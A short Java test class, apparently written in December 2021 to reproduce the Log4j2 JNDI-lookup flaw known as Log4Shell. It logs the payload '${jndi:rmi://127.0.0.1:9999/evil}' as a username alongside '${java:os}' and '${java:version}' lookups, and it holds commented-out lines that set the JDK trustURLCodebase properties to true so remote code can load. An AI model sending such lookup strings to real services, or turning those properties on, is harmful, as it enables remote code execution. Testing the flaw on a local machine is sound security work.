package com.itpkm.springmvclog4j2.test;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Log4j2简单测试日志类
 * @author itpkm
 * @date 2021年12月14日
 */
public class Log4j2SimpleTest {
    private static final Logger LOG = LogManager.getLogger(Log4j2SimpleTest.class);

    public static void main(String[] args) {

        //JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false
        //禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了,测试了似乎没生效
        //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        //System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        String userName = "${jndi:rmi://127.0.0.1:9999/evil}";
        LOG.info("Hello, {}", userName);
        LOG.info("Hello, {}", "${java:os}");
        LOG.info("Hello, {}", "${java:version}");
    }
}
